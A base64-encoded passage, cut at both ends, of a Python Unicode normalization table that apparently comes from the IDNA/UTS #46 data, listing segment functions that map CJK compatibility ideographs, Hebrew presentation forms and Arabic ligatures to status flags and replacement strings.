RkFDRiwgXCdNXCcsIFwnXHhmMFx4YTJceGExXHg4YVwnKSxcbiAgICAoMHhGQUQwLCBcJ01cJywgXCdceGYwXHhhMlx4YTFceDg0XCcpLFxuICAgICgweEZBRDEsIFwnTVwnLCBcJ1x4ZjBceGEzXHg4Zlx4OTVcJyksXG4gICAgKDB4RkFEMiwgXCdNXCcsIFwnXHhlM1x4YWVceDlkXCcpLFxuICAgICgweEZBRDMsIFwnTVwnLCBcJ1x4ZTRceDgwXHg5OFwnKSxcbiAgICAoMHhGQUQ0LCBcJ01cJywgXCdceGU0XHg4MFx4YjlcJyksXG4gICAgKDB4RkFENSwgXCdNXCcsIFwnXHhmMFx4YTVceDg5XHg4OVwnKSxcbiAgICAoMHhGQUQ2LCBcJ01cJywgXCdceGYwXHhhNVx4YjNceDkwXCcpLFxuICAgICgweEZBRDcsIFwnTVwnLCBcJ1x4ZjBceGE3XHhiYlx4OTNcJyksXG4gICAgKDB4RkFEOCwgXCdNXCcsIFwnXHhlOVx4YmRceDgzXCcpLFxuICAgICgweEZBRDksIFwnTVwnLCBcJ1x4ZTlceGJlXHg4ZVwnKSxcbiAgICAoMHhGQURBLCBcJ1hcJyksXG4gICAgKDB4RkIwMCwgXCdNXCcsIFwnZmZcJyksXG4gICAgKDB4RkIwMSwgXCdNXCcsIFwnZmlcJyksXG4gICAgXVxuXG5kZWYgX3NlZ180NCgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4RkIwMiwgXCdNXCcsIFwnZmxcJyksXG4gICAgKDB4RkIwMywgXCdNXCcsIFwnZmZpXCcpLFxuICAgICgweEZCMDQsIFwnTVwnLCBcJ2ZmbFwnKSxcbiAgICAoMHhGQjA1LCBcJ01cJywgXCdzdFwnKSxcbiAgICAoMHhGQjA3LCBcJ1hcJyksXG4gICAgKDB4RkIxMywgXCdNXCcsIFwnXHhkNVx4YjRceGQ1XHhiNlwnKSxcbiAgICAoMHhGQjE0LCBcJ01cJywgXCdceGQ1XHhiNFx4ZDVceGE1XCcpLFxuICAgICgweEZCMTUsIFwnTVwnLCBcJ1x4ZDVceGI0XHhkNVx4YWJcJyksXG4gICAgKDB4RkIxNiwgXCdNXCcsIFwnXHhkNVx4YmVceGQ1XHhiNlwnKSxcbiAgICAoMHhGQjE3LCBcJ01cJywgXCdceGQ1XHhiNFx4ZDVceGFkXCcpLFxuICAgICgweEZCMTgsIFwnWFwnKSxcbiAgICAoMHhGQjFELCBcJ01cJywgXCdceGQ3XHg5OVx4ZDZceGI0XCcpLFxuICAgICgweEZCMUUsIFwnVlwnKSxcbiAgICAoMHhGQjFGLCBcJ01cJywgXCdceGQ3XHhiMlx4ZDZceGI3XCcpLFxuICAgICgweEZCMjAsIFwnTVwnLCBcJ1x4ZDdceGEyXCcpLFxuICAgICgweEZCMjEsIFwnTVwnLCBcJ1x4ZDdceDkwXCcpLFxuICAgICgweEZCMjIsIFwnTVwnLCBcJ1x4ZDdceDkzXCcpLFxuICAgICgweEZCMjMsIFwnTVwnLCBcJ1x4ZDdceDk0XCcpLFxuICAgICgweEZCMjQsIFwnTVwnLCBcJ1x4ZDdceDliXCcpLFxuICAgICgweEZCMjUsIFwnTVwnLCBcJ1x4ZDdceDljXCcpLFxuICAgICgweEZCMjYsIFwnTVwnLCBcJ1x4ZDdceDlkXCcpLFxuICAgICgweEZCMjcsIFwnTVwnLCBcJ1x4ZDdceGE4XCcpLFxuICAgICgweEZCMjgsIFwnTVwnLCBcJ1x4ZDdceGFhXCcpLFxuICAgICgweEZCMjksIFwnM1wnLCBcJytcJyksXG4gICAgKDB4RkIyQSwgXCdNXCcsIFwnXHhkN1x4YTlceGQ3XHg4MVwnKSxcbiAgICAoMHhGQjJCLCBcJ01cJywgXCdceGQ3XHhhOVx4ZDdceDgyXCcpLFxuICAgICgweEZCMkMsIFwnTVwnLCBcJ1x4ZDdceGE5XHhkNlx4YmNceGQ3XHg4MVwnKSxcbiAgICAoMHhGQjJELCBcJ01cJywgXCdceGQ3XHhhOVx4ZDZceGJjXHhkN1x4ODJcJyksXG4gICAgKDB4RkIyRSwgXCdNXCcsIFwnXHhkN1x4OTBceGQ2XHhiN1wnKSxcbiAgICAoMHhGQjJGLCBcJ01cJywgXCdceGQ3XHg5MFx4ZDZceGI4XCcpLFxuICAgICgweEZCMzAsIFwnTVwnLCBcJ1x4ZDdceDkwXHhkNlx4YmNcJyksXG4gICAgKDB4RkIzMSwgXCdNXCcsIFwnXHhkN1x4OTFceGQ2XHhiY1wnKSxcbiAgICAoMHhGQjMyLCBcJ01cJywgXCdceGQ3XHg5Mlx4ZDZceGJjXCcpLFxuICAgICgweEZCMzMsIFwnTVwnLCBcJ1x4ZDdceDkzXHhkNlx4YmNcJyksXG4gICAgKDB4RkIzNCwgXCdNXCcsIFwnXHhkN1x4OTRceGQ2XHhiY1wnKSxcbiAgICAoMHhGQjM1LCBcJ01cJywgXCdceGQ3XHg5NVx4ZDZceGJjXCcpLFxuICAgICgweEZCMzYsIFwnTVwnLCBcJ1x4ZDdceDk2XHhkNlx4YmNcJyksXG4gICAgKDB4RkIzNywgXCdYXCcpLFxuICAgICgweEZCMzgsIFwnTVwnLCBcJ1x4ZDdceDk4XHhkNlx4YmNcJyksXG4gICAgKDB4RkIzOSwgXCdNXCcsIFwnXHhkN1x4OTlceGQ2XHhiY1wnKSxcbiAgICAoMHhGQjNBLCBcJ01cJywgXCdceGQ3XHg5YVx4ZDZceGJjXCcpLFxuICAgICgweEZCM0IsIFwnTVwnLCBcJ1x4ZDdceDliXHhkNlx4YmNcJyksXG4gICAgKDB4RkIzQywgXCdNXCcsIFwnXHhkN1x4OWNceGQ2XHhiY1wnKSxcbiAgICAoMHhGQjNELCBcJ1hcJyksXG4gICAgKDB4RkIzRSwgXCdNXCcsIFwnXHhkN1x4OWVceGQ2XHhiY1wnKSxcbiAgICAoMHhGQjNGLCBcJ1hcJyksXG4gICAgKDB4RkI0MCwgXCdNXCcsIFwnXHhkN1x4YTBceGQ2XHhiY1wnKSxcbiAgICAoMHhGQjQxLCBcJ01cJywgXCdceGQ3XHhhMVx4ZDZceGJjXCcpLFxuICAgICgweEZCNDIsIFwnWFwnKSxcbiAgICAoMHhGQjQzLCBcJ01cJywgXCdceGQ3XHhhM1x4ZDZceGJjXCcpLFxuICAgICgweEZCNDQsIFwnTVwnLCBcJ1x4ZDdceGE0XHhkNlx4YmNcJyksXG4gICAgKDB4RkI0NSwgXCdYXCcpLFxuICAgICgweEZCNDYsIFwnTVwnLCBcJ1x4ZDdceGE2XHhkNlx4YmNcJyksXG4gICAgKDB4RkI0NywgXCdNXCcsIFwnXHhkN1x4YTdceGQ2XHhiY1wnKSxcbiAgICAoMHhGQjQ4LCBcJ01cJywgXCdceGQ3XHhhOFx4ZDZceGJjXCcpLFxuICAgICgweEZCNDksIFwnTVwnLCBcJ1x4ZDdceGE5XHhkNlx4YmNcJyksXG4gICAgKDB4RkI0QSwgXCdNXCcsIFwnXHhkN1x4YWFceGQ2XHhiY1wnKSxcbiAgICAoMHhGQjRCLCBcJ01cJywgXCdceGQ3XHg5NVx4ZDZceGI5XCcpLFxuICAgICgweEZCNEMsIFwnTVwnLCBcJ1x4ZDdceDkxXHhkNlx4YmZcJyksXG4gICAgKDB4RkI0RCwgXCdNXCcsIFwnXHhkN1x4OWJceGQ2XHhiZlwnKSxcbiAgICAoMHhGQjRFLCBcJ01cJywgXCdceGQ3XHhhNFx4ZDZceGJmXCcpLFxuICAgICgweEZCNEYsIFwnTVwnLCBcJ1x4ZDdceDkwXHhkN1x4OWNcJyksXG4gICAgKDB4RkI1MCwgXCdNXCcsIFwnXHhkOVx4YjFcJyksXG4gICAgKDB4RkI1MiwgXCdNXCcsIFwnXHhkOVx4YmJcJyksXG4gICAgKDB4RkI1NiwgXCdNXCcsIFwnXHhkOVx4YmVcJyksXG4gICAgKDB4RkI1QSwgXCdNXCcsIFwnXHhkYVx4ODBcJyksXG4gICAgKDB4RkI1RSwgXCdNXCcsIFwnXHhkOVx4YmFcJyksXG4gICAgKDB4RkI2MiwgXCdNXCcsIFwnXHhkOVx4YmZcJyksXG4gICAgKDB4RkI2NiwgXCdNXCcsIFwnXHhkOVx4YjlcJyksXG4gICAgKDB4RkI2QSwgXCdNXCcsIFwnXHhkYVx4YTRcJyksXG4gICAgKDB4RkI2RSwgXCdNXCcsIFwnXHhkYVx4YTZcJyksXG4gICAgKDB4RkI3MiwgXCdNXCcsIFwnXHhkYVx4ODRcJyksXG4gICAgKDB4RkI3NiwgXCdNXCcsIFwnXHhkYVx4ODNcJyksXG4gICAgKDB4RkI3QSwgXCdNXCcsIFwnXHhkYVx4ODZcJyksXG4gICAgKDB4RkI3RSwgXCdNXCcsIFwnXHhkYVx4ODdcJyksXG4gICAgKDB4RkI4MiwgXCdNXCcsIFwnXHhkYVx4OGRcJyksXG4gICAgKDB4RkI4NCwgXCdNXCcsIFwnXHhkYVx4OGNcJyksXG4gICAgKDB4RkI4NiwgXCdNXCcsIFwnXHhkYVx4OGVcJyksXG4gICAgKDB4RkI4OCwgXCdNXCcsIFwnXHhkYVx4ODhcJyksXG4gICAgKDB4RkI4QSwgXCdNXCcsIFwnXHhkYVx4OThcJyksXG4gICAgKDB4RkI4QywgXCdNXCcsIFwnXHhkYVx4OTFcJyksXG4gICAgKDB4RkI4RSwgXCdNXCcsIFwnXHhkYVx4YTlcJyksXG4gICAgKDB4RkI5MiwgXCdNXCcsIFwnXHhkYVx4YWZcJyksXG4gICAgKDB4RkI5NiwgXCdNXCcsIFwnXHhkYVx4YjNcJyksXG4gICAgKDB4RkI5QSwgXCdNXCcsIFwnXHhkYVx4YjFcJyksXG4gICAgKDB4RkI5RSwgXCdNXCcsIFwnXHhkYVx4YmFcJyksXG4gICAgKDB4RkJBMCwgXCdNXCcsIFwnXHhkYVx4YmJcJyksXG4gICAgKDB4RkJBNCwgXCdNXCcsIFwnXHhkYlx4ODBcJyksXG4gICAgKDB4RkJBNiwgXCdNXCcsIFwnXHhkYlx4ODFcJyksXG4gICAgKDB4RkJBQSwgXCdNXCcsIFwnXHhkYVx4YmVcJyksXG4gICAgKDB4RkJBRSwgXCdNXCcsIFwnXHhkYlx4OTJcJyksXG4gICAgKDB4RkJCMCwgXCdNXCcsIFwnXHhkYlx4OTNcJyksXG4gICAgKDB4RkJCMiwgXCdWXCcpLFxuICAgICgweEZCQzMsIFwnWFwnKSxcbiAgICAoMHhGQkQzLCBcJ01cJywgXCdceGRhXHhhZFwnKSxcbiAgICAoMHhGQkQ3LCBcJ01cJywgXCdceGRiXHg4N1wnKSxcbiAgICAoMHhGQkQ5LCBcJ01cJywgXCdceGRiXHg4NlwnKSxcbiAgICAoMHhGQkRCLCBcJ01cJywgXCdceGRiXHg4OFwnKSxcbiAgICAoMHhGQkRELCBcJ01cJywgXCdceGRiXHg4N1x4ZDlceGI0XCcpLFxuICAgICgweEZCREUsIFwnTVwnLCBcJ1x4ZGJceDhiXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNDUoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweEZCRTAsIFwnTVwnLCBcJ1x4ZGJceDg1XCcpLFxuICAgICgweEZCRTIsIFwnTVwnLCBcJ1x4ZGJceDg5XCcpLFxuICAgICgweEZCRTQsIFwnTVwnLCBcJ1x4ZGJceDkwXCcpLFxuICAgICgweEZCRTgsIFwnTVwnLCBcJ1x4ZDlceDg5XCcpLFxuICAgICgweEZCRUEsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkOFx4YTdcJyksXG4gICAgKDB4RkJFQywgXCdNXCcsIFwnXHhkOFx4YTZceGRiXHg5NVwnKSxcbiAgICAoMHhGQkVFLCBcJ01cJywgXCdceGQ4XHhhNlx4ZDlceDg4XCcpLFxuICAgICgweEZCRjAsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkYlx4ODdcJyksXG4gICAgKDB4RkJGMiwgXCdNXCcsIFwnXHhkOFx4YTZceGRiXHg4NlwnKSxcbiAgICAoMHhGQkY0LCBcJ01cJywgXCdceGQ4XHhhNlx4ZGJceDg4XCcpLFxuICAgICgweEZCRjYsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkYlx4OTBcJyksXG4gICAgKDB4RkJGOSwgXCdNXCcsIFwnXHhkOFx4YTZceGQ5XHg4OVwnKSxcbiAgICAoMHhGQkZDLCBcJ01cJywgXCdceGRiXHg4Y1wnKSxcbiAgICAoMHhGQzAwLCBcJ01cJywgXCdceGQ4XHhhNlx4ZDhceGFjXCcpLFxuICAgICgweEZDMDEsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkOFx4YWRcJyksXG4gICAgKDB4RkMwMiwgXCdNXCcsIFwnXHhkOFx4YTZceGQ5XHg4NVwnKSxcbiAgICAoMHhGQzAzLCBcJ01cJywgXCdceGQ4XHhhNlx4ZDlceDg5XCcpLFxuICAgICgweEZDMDQsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkOVx4OGFcJyksXG4gICAgKDB4RkMwNSwgXCdNXCcsIFwnXHhkOFx4YThceGQ4XHhhY1wnKSxcbiAgICAoMHhGQzA2LCBcJ01cJywgXCdceGQ4XHhhOFx4ZDhceGFkXCcpLFxuICAgICgweEZDMDcsIFwnTVwnLCBcJ1x4ZDhceGE4XHhkOFx4YWVcJyksXG4gICAgKDB4RkMwOCwgXCdNXCcsIFwnXHhkOFx4YThceGQ5XHg4NVwnKSxcbiAgICAoMHhGQzA5LCBcJ01cJywgXCdceGQ4XHhhOFx4ZDlceDg5XCcpLFxuICAgICgweEZDMEEsIFwnTVwnLCBcJ1x4ZDhceGE4XHhkOVx4OGFcJyksXG4gICAgKDB4RkMwQiwgXCdNXCcsIFwnXHhkOFx4YWFceGQ4XHhhY1wnKSxcbiAgICAoMHhGQzBDLCBcJ01cJywgXCdceGQ4XHhhYVx4ZDhceGFkXCcpLFxuICAgICgweEZDMEQsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOFx4YWVcJyksXG4gICAgKDB4RkMwRSwgXCdNXCcsIFwnXHhkOFx4YWFceGQ5XHg4NVwnKSxcbiAgICAoMHhGQzBGLCBcJ01cJywgXCdceGQ4XHhhYVx4ZDlceDg5XCcpLFxuICAgICgweEZDMTAsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOVx4OGFcJyksXG4gICAgKDB4RkMxMSwgXCdNXCcsIFwnXHhkOFx4YWJceGQ4XHhhY1wnKSxcbiAgICAoMHhGQzEyLCBcJ01cJywgXCdceGQ4XHhhYlx4ZDlceDg1XCcpLFxuICAgICgweEZDMTMsIFwnTVwnLCBcJ1x4ZDhceGFiXHhkOVx4ODlcJyksXG4gICAgKDB4RkMxNCwgXCdNXCcsIFwnXHhkOFx4YWJceGQ5XHg4YVwnKSxcbiAgICAoMHhGQzE1LCBcJ01cJywgXCdceGQ4XHhhY1x4ZDhceGFkXCcpLFxuICAgICgweEZDMTYsIFwnTVwnLCBcJ1x4ZDhceGFjXHhkOVx4ODVcJyksXG4gICAgKDB4RkMxNywgXCdNXCcsIFwnXHhkOFx4YWRceGQ4XHhhY1wnKSxcbiAgICAoMHhGQzE4LCBcJ01cJywgXCdceGQ4XHhhZFx4ZDlceDg1XCcpLFxuICAgICgweEZDMTksIFwnTVwnLCBcJ1x4ZDhceGFlXHhkOFx4YWNcJyksXG4gICAgKDB4RkMxQSwgXCdNXCcsIFwnXHhkOFx4YWVceGQ4XHhhZFwnKSxcbiAgICAoMHhGQzFCLCBcJ01cJywgXCdceGQ4XHhhZVx4ZDlceDg1XCcpLFxuICAgICgweEZDMUMsIFwnTVwnLCBcJ1x4ZDhceGIzXHhkOFx4YWNcJyksXG4gICAgKDB4RkMxRCwgXCdNXCcsIFwnXHhkOFx4YjNceGQ4XHhhZFwnKSxcbiAgICAoMHhGQzFFLCBcJ01cJywgXCdceGQ4XHhiM1x4ZDhceGFlXCcpLFxuICAgICgweEZDMUYsIFwnTVwnLCBcJ1x4ZDhceGIzXHhkOVx4ODVcJyksXG4gICAgKDB4RkMyMCwgXCdNXCcsIFwnXHhkOFx4YjVceGQ4XHhhZFwnKSxcbiAgICAoMHhGQzIxLCBcJ01cJywgXCdceGQ4XHhiNVx4ZDlceDg1XCcpLFxuICAgICgweEZDMjIsIFwnTVwnLCBcJ1x4ZDhceGI2XHhkOFx4YWNcJyksXG4gICAgKDB4RkMyMywgXCdNXCcsIFwnXHhkOFx4YjZceGQ4XHhhZFwnKSxcbiAgICAoMHhGQzI0LCBcJ01cJywgXCdceGQ4XHhiNlx4ZDhceGFlXCcpLFxuICAgICgweEZDMjUsIFwnTVwnLCBcJ1x4ZDhceGI2XHhkOVx4ODVcJyksXG4gICAgKDB4RkMyNiwgXCdNXCcsIFwnXHhkOFx4YjdceGQ4XHhhZFwnKSxcbiAgICAoMHhGQzI3LCBcJ01cJywgXCdceGQ4XHhiN1x4ZDlceDg1XCcpLFxuICAgICgweEZDMjgsIFwnTVwnLCBcJ1x4ZDhceGI4XHhkOVx4ODVcJyksXG4gICAgKDB4RkMyOSwgXCdNXCcsIFwnXHhkOFx4YjlceGQ4XHhhY1wnKSxcbiAgICAoMHhGQzJBLCBcJ01cJywgXCdceGQ4XHhiOVx4ZDlceDg1XCcpLFxuICAgICgweEZDMkIsIFwnTVwnLCBcJ1x4ZDhceGJhXHhkOFx4YWNcJyksXG4gICAgKDB4RkMyQywgXCdNXCcsIFwnXHhkOFx4YmFceGQ5XHg4NVwnKSxcbiAgICAoMHhGQzJELCBcJ01cJywgXCdceGQ5XHg4MVx4ZDhceGFjXCcpLFxuICAgICgweEZDMkUsIFwnTVwnLCBcJ1x4ZDlceDgxXHhkOFx4YWRcJyksXG4gICAgKDB4RkMyRiwgXCdNXCcsIFwnXHhkOVx4ODFceGQ4XHhhZVwnKSxcbiAgICAoMHhGQzMwLCBcJ01cJywgXCdceGQ5XHg4MVx4ZDlceDg1XCcpLFxuICAgICgweEZDMzEsIFwnTVwnLCBcJ1x4ZDlceDgxXHhkOVx4ODlcJyksXG4gICAgKDB4RkMzMiwgXCdNXCcsIFwnXHhkOVx4ODFceGQ5XHg4YVwnKSxcbiAgICAoMHhGQzMzLCBcJ01cJywgXCdceGQ5XHg4Mlx4ZDhceGFkXCcpLFxuICAgICgweEZDMzQsIFwnTVwnLCBcJ1x4ZDlceDgyXHhkOVx4ODVcJyksXG4gICAgKDB4RkMzNSwgXCdNXCcsIFwnXHhkOVx4ODJceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzM2LCBcJ01cJywgXCdceGQ5XHg4Mlx4ZDlceDhhXCcpLFxuICAgICgweEZDMzcsIFwnTVwnLCBcJ1x4ZDlceDgzXHhkOFx4YTdcJyksXG4gICAgKDB4RkMzOCwgXCdNXCcsIFwnXHhkOVx4ODNceGQ4XHhhY1wnKSxcbiAgICAoMHhGQzM5LCBcJ01cJywgXCdceGQ5XHg4M1x4ZDhceGFkXCcpLFxuICAgICgweEZDM0EsIFwnTVwnLCBcJ1x4ZDlceDgzXHhkOFx4YWVcJyksXG4gICAgKDB4RkMzQiwgXCdNXCcsIFwnXHhkOVx4ODNceGQ5XHg4NFwnKSxcbiAgICAoMHhGQzNDLCBcJ01cJywgXCdceGQ5XHg4M1x4ZDlceDg1XCcpLFxuICAgICgweEZDM0QsIFwnTVwnLCBcJ1x4ZDlceDgzXHhkOVx4ODlcJyksXG4gICAgKDB4RkMzRSwgXCdNXCcsIFwnXHhkOVx4ODNceGQ5XHg4YVwnKSxcbiAgICAoMHhGQzNGLCBcJ01cJywgXCdceGQ5XHg4NFx4ZDhceGFjXCcpLFxuICAgICgweEZDNDAsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOFx4YWRcJyksXG4gICAgKDB4RkM0MSwgXCdNXCcsIFwnXHhkOVx4ODRceGQ4XHhhZVwnKSxcbiAgICAoMHhGQzQyLCBcJ01cJywgXCdceGQ5XHg4NFx4ZDlceDg1XCcpLFxuICAgICgweEZDNDMsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOVx4ODlcJyksXG4gICAgKDB4RkM0NCwgXCdNXCcsIFwnXHhkOVx4ODRceGQ5XHg4YVwnKSxcbiAgICAoMHhGQzQ1LCBcJ01cJywgXCdceGQ5XHg4NVx4ZDhceGFjXCcpLFxuICAgICgweEZDNDYsIFwnTVwnLCBcJ1x4ZDlceDg1XHhkOFx4YWRcJyksXG4gICAgKDB4RkM0NywgXCdNXCcsIFwnXHhkOVx4ODVceGQ4XHhhZVwnKSxcbiAgICAoMHhGQzQ4LCBcJ01cJywgXCdceGQ5XHg4NVx4ZDlceDg1XCcpLFxuICAgICgweEZDNDksIFwnTVwnLCBcJ1x4ZDlceDg1XHhkOVx4ODlcJyksXG4gICAgKDB4RkM0QSwgXCdNXCcsIFwnXHhkOVx4ODVceGQ5XHg4YVwnKSxcbiAgICAoMHhGQzRCLCBcJ01cJywgXCdceGQ5XHg4Nlx4ZDhceGFjXCcpLFxuICAgICgweEZDNEMsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOFx4YWRcJyksXG4gICAgKDB4RkM0RCwgXCdNXCcsIFwnXHhkOVx4ODZceGQ4XHhhZVwnKSxcbiAgICAoMHhGQzRFLCBcJ01cJywgXCdceGQ5XHg4Nlx4ZDlceDg1XCcpLFxuICAgICgweEZDNEYsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOVx4ODlcJyksXG4gICAgKDB4RkM1MCwgXCdNXCcsIFwnXHhkOVx4ODZceGQ5XHg4YVwnKSxcbiAgICAoMHhGQzUxLCBcJ01cJywgXCdceGQ5XHg4N1x4ZDhceGFjXCcpLFxuICAgICgweEZDNTIsIFwnTVwnLCBcJ1x4ZDlceDg3XHhkOVx4ODVcJyksXG4gICAgKDB4RkM1MywgXCdNXCcsIFwnXHhkOVx4ODdceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzU0LCBcJ01cJywgXCdceGQ5XHg4N1x4ZDlceDhhXCcpLFxuICAgICgweEZDNTUsIFwnTVwnLCBcJ1x4ZDlceDhhXHhkOFx4YWNcJyksXG4gICAgKDB4RkM1NiwgXCdNXCcsIFwnXHhkOVx4OGFceGQ4XHhhZFwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzQ2KCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHhGQzU3LCBcJ01cJywgXCdceGQ5XHg4YVx4ZDhceGFlXCcpLFxuICAgICgweEZDNTgsIFwnTVwnLCBcJ1x4ZDlceDhhXHhkOVx4ODVcJyksXG4gICAgKDB4RkM1OSwgXCdNXCcsIFwnXHhkOVx4OGFceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzVBLCBcJ01cJywgXCdceGQ5XHg4YVx4ZDlceDhhXCcpLFxuICAgICgweEZDNUIsIFwnTVwnLCBcJ1x4ZDhceGIwXHhkOVx4YjBcJyksXG4gICAgKDB4RkM1QywgXCdNXCcsIFwnXHhkOFx4YjFceGQ5XHhiMFwnKSxcbiAgICAoMHhGQzVELCBcJ01cJywgXCdceGQ5XHg4OVx4ZDlceGIwXCcpLFxuICAgICgweEZDNUUsIFwnM1wnLCBcJyBceGQ5XHg4Y1x4ZDlceDkxXCcpLFxuICAgICgweEZDNUYsIFwnM1wnLCBcJyBceGQ5XHg4ZFx4ZDlceDkxXCcpLFxuICAgICgweEZDNjAsIFwnM1wnLCBcJyBceGQ5XHg4ZVx4ZDlceDkxXCcpLFxuICAgICgweEZDNjEsIFwnM1wnLCBcJyBceGQ5XHg4Zlx4ZDlceDkxXCcpLFxuICAgICgweEZDNjIsIFwnM1wnLCBcJyBceGQ5XHg5MFx4ZDlceDkxXCcpLFxuICAgICgweEZDNjMsIFwnM1wnLCBcJyBceGQ5XHg5MVx4ZDlceGIwXCcpLFxuICAgICgweEZDNjQsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkOFx4YjFcJyksXG4gICAgKDB4RkM2NSwgXCdNXCcsIFwnXHhkOFx4YTZceGQ4XHhiMlwnKSxcbiAgICAoMHhGQzY2LCBcJ01cJywgXCdceGQ4XHhhNlx4ZDlceDg1XCcpLFxuICAgICgweEZDNjcsIFwnTVwnLCBcJ1x4ZDhceGE2XHhkOVx4ODZcJyksXG4gICAgKDB4RkM2OCwgXCdNXCcsIFwnXHhkOFx4YTZceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzY5LCBcJ01cJywgXCdceGQ4XHhhNlx4ZDlceDhhXCcpLFxuICAgICgweEZDNkEsIFwnTVwnLCBcJ1x4ZDhceGE4XHhkOFx4YjFcJyksXG4gICAgKDB4RkM2QiwgXCdNXCcsIFwnXHhkOFx4YThceGQ4XHhiMlwnKSxcbiAgICAoMHhGQzZDLCBcJ01cJywgXCdceGQ4XHhhOFx4ZDlceDg1XCcpLFxuICAgICgweEZDNkQsIFwnTVwnLCBcJ1x4ZDhceGE4XHhkOVx4ODZcJyksXG4gICAgKDB4RkM2RSwgXCdNXCcsIFwnXHhkOFx4YThceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzZGLCBcJ01cJywgXCdceGQ4XHhhOFx4ZDlceDhhXCcpLFxuICAgICgweEZDNzAsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOFx4YjFcJyksXG4gICAgKDB4RkM3MSwgXCdNXCcsIFwnXHhkOFx4YWFceGQ4XHhiMlwnKSxcbiAgICAoMHhGQzcyLCBcJ01cJywgXCdceGQ4XHhhYVx4ZDlceDg1XCcpLFxuICAgICgweEZDNzMsIFwnTVwnLCBcJ1x4ZDhceGFhXHhkOVx4ODZcJyksXG4gICAgKDB4RkM3NCwgXCdNXCcsIFwnXHhkOFx4YWFceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzc1LCBcJ01cJywgXCdceGQ4XHhhYVx4ZDlceDhhXCcpLFxuICAgICgweEZDNzYsIFwnTVwnLCBcJ1x4ZDhceGFiXHhkOFx4YjFcJyksXG4gICAgKDB4RkM3NywgXCdNXCcsIFwnXHhkOFx4YWJceGQ4XHhiMlwnKSxcbiAgICAoMHhGQzc4LCBcJ01cJywgXCdceGQ4XHhhYlx4ZDlceDg1XCcpLFxuICAgICgweEZDNzksIFwnTVwnLCBcJ1x4ZDhceGFiXHhkOVx4ODZcJyksXG4gICAgKDB4RkM3QSwgXCdNXCcsIFwnXHhkOFx4YWJceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzdCLCBcJ01cJywgXCdceGQ4XHhhYlx4ZDlceDhhXCcpLFxuICAgICgweEZDN0MsIFwnTVwnLCBcJ1x4ZDlceDgxXHhkOVx4ODlcJyksXG4gICAgKDB4RkM3RCwgXCdNXCcsIFwnXHhkOVx4ODFceGQ5XHg4YVwnKSxcbiAgICAoMHhGQzdFLCBcJ01cJywgXCdceGQ5XHg4Mlx4ZDlceDg5XCcpLFxuICAgICgweEZDN0YsIFwnTVwnLCBcJ1x4ZDlceDgyXHhkOVx4OGFcJyksXG4gICAgKDB4RkM4MCwgXCdNXCcsIFwnXHhkOVx4ODNceGQ4XHhhN1wnKSxcbiAgICAoMHhGQzgxLCBcJ01cJywgXCdceGQ5XHg4M1x4ZDlceDg0XCcpLFxuICAgICgweEZDODIsIFwnTVwnLCBcJ1x4ZDlceDgzXHhkOVx4ODVcJyksXG4gICAgKDB4RkM4MywgXCdNXCcsIFwnXHhkOVx4ODNceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzg0LCBcJ01cJywgXCdceGQ5XHg4M1x4ZDlceDhhXCcpLFxuICAgICgweEZDODUsIFwnTVwnLCBcJ1x4ZDlceDg0XHhkOVx4ODVcJyksXG4gICAgKDB4RkM4NiwgXCdNXCcsIFwnXHhkOVx4ODRceGQ5XHg4OVwnKSxcbiAgICAoMHhGQzg3LCBcJ01cJywgXCdceGQ5XHg4NFx4ZDlceDhhXCcpLFxuICAgICgweEZDODgsIFwnTVwnLCBcJ1x4ZDlceDg1XHhkOFx4YTdcJyksXG4gICAgKDB4RkM4OSwgXCdNXCcsIFwnXHhkOVx4ODVceGQ5XHg4NVwnKSxcbiAgICAoMHhGQzhBLCBcJ01cJywgXCdceGQ5XHg4Nlx4ZDhceGIxXCcpLFxuICAgICgweEZDOEIsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOFx4YjJcJyksXG4gICAgKDB4RkM4QywgXCdNXCcsIFwnXHhkOVx4ODZceGQ5XHg4NVwnKSxcbiAgICAoMHhGQzhELCBcJ01cJywgXCdceGQ5XHg4Nlx4ZDlceDg2XCcpLFxuICAgICgweEZDOEUsIFwnTVwnLCBcJ1x4ZDlceDg2XHhkOVx4ODlcJyksXG4gICAgKDB4RkM4RiwgXCdNXCcsIFwnXHhkOVx4ODZceGQ5XHg4YVwnKSxcbiAgICAoMHhGQzkwLCBcJ01cJywgXCdceGQ5XHg4OVx4ZDlceGIwXCcpLFxuICAgICgweEZDOTEsIFwnTVwnLCBcJ1x4ZDlceDhhXHhkOFx4YjFcJyksXG4gICAgKDB4RkM5MiwgXCdNXCcsIFwnXHhkOVx4OGFceGQ4XHhiMlwnKSxcbiAgICAoMHhGQzkzLCBcJ01cJywgXCdceGQ5XHg4YVx4ZDlceDg1XCcpLFxuICAgICgweEZDOTQsIFwnTVwnLCBcJ1x4ZDlceDhhXHhkOVx4ODZcJyksXG4gICAgKDB4RkM5NSwgXCdNXCcsIFwn